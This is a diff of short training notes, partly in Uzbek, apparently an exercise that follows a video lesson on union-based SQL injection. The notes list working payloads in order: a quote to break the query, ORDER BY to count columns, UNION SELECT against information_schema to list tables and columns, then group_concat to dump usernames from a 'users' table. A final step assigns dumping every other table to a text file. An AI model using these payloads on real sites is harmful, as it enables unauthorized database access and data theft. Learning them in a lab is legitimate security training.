@@ -1,5 +1,16 @@
-'
 
+1. '
 2. order by some number(in video eample 11) --
 3. Union select some nubers (in video eample 1,2,3,4,5,6,7,8,9,10,11) --
-4. Union select 1,2,3,4,5,6 table_name
+4. Union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables where table_schema=database() -- 
+5. Union select 1,2,3,4,5,6,column_name,8,9,10,11 from information_schema.columns where table_name='users' --
+6. Union select 1,2,3,4,5,6,group_concat(uname),8,9,10,11 from users --
+7. hamma qolgan tablelarni ichidagi columnlarini olib chiqing va ko'rsatilgan formatda yozib txt qilib tashlang!
+
+FORMAT:
+
+#TABLE_NAME (misol uchun: users)
+
+//column_name (USER ICHIDAGI COLUMNLAR)
+
+// PROPERTY (HAMMASINI VIDEODA KO'RSATILGANDAY TAXLANG!)
